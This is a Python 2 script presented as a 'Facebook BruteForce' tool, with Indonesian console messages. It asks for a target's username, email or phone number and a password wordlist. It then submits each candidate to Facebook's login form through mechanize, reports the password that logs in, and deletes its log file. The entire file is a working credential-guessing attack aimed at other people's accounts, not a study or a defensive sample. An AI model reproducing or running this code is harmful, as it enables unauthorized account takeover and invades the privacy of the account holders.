#!/usr/bin/python
# -*- coding: utf-8 -*-
        #___________________________________________#
        #                                           #
        #       Facebook BruteForce, by BUDIMAN     #
        #       Contact: ariftau285@gmail.com       #
        #                                           #
        #############################################


import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()

time.sleep(0.5)
print('''
 ____BetaTest  2.0_________________________
| __ ) _   _  __| / |_ __ ___   __ _| \ | |
|  _ \| | | |/ _` | | '_ ` _ \ / _` |  \| |
| |_) | |_| | (_| | | | | | | | (_| | |\  |
|____/ \__,_|\__,_|_|_| |_| |_|\__,_|_| \_|

''')
user = raw_input('[?] Target Username/ID/Email/PHONE >>> ')
time.sleep(2)
print '\nmembaca data '+user+'...'
time.sleep(1)
print '\n'
wrdlstFileName = raw_input('\n[?] Wordlist.txt >>> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File tidak ditemukan!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' sekarang...'

time.sleep(1)
print '\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n'
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

            fb = browser.open('https://web.facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://web.facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] target Password ditemukan!! > '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!]Sandi ini salah! > "+str(password)
        except KeyboardInterrupt:
            print '\n<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print 'tak ada satupun SANDI yang bener coba pake racikan sendiri.ketik seperti di bawah ini untuk meracik'
time.sleep(0.9)
print '\nnano wordlist.txt'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
